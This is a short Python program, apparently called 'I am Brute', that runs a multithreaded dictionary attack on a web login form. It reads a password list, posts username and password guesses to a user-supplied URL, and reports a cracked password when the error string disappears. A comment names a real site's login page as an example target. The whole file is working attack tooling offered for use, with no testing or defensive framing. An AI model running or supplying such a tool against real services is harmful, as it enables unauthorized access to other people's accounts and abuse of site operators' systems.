import requests
from termcolor import colored
import threading
import os
from art import text2art
# Return ASCII text (default font) and default chr_ignore=True
Art = text2art("I am Brute")
print(Art)

def login(url, username, passwords, errorstr, payload):
    data = payload
    for password in passwords:
        data['username'] = username
        data['password'] = password.rstrip()
        res = requests.post(url, data=data)
        if errorstr not in res.text:
            print(
                colored(f'[+] Password is cracked user : {username}   password : { password}', 'green'))
            os._exit(1)
        else:
            print(
                f'[-] Wrong password user : {username}   password : { password}')


def main():
    url = input('Enter url : ')  # 'https://www.reddit.com/login/?dest=https%3A%2F%2Fwww.reddit.com%2F'
    username = input('Enter username : ')  # 'admin'
    filename = input('Enter file path : ')  # 'Downloads\I-am-Brute-master\I-am-Brute-master\passlist.txt'
    payload = {'Login': 'Login'}
    errorstr = input('Enter error string : ')  # 'Login failed'
    thread_lmt = int(input('Enter total no. of threads : '))  # 10
    threads = []

    with open(filename, 'r') as fileobj:
        passwords = fileobj.readlines()
        step = len(passwords)//thread_lmt
        for i in range(0, len(passwords), step):
            wrap = passwords[i:i+step]
            t = threading.Thread(target=login, args=[
                url, username, wrap, errorstr, payload])
            t.start()
            threads.append(t)

        # login(url, username, passwords, errorstr, payload)

    for thread in threads:
        thread.join()

    print(colored('Can\'t find password', 'red'))


if __name__ == '__main__':
    main()
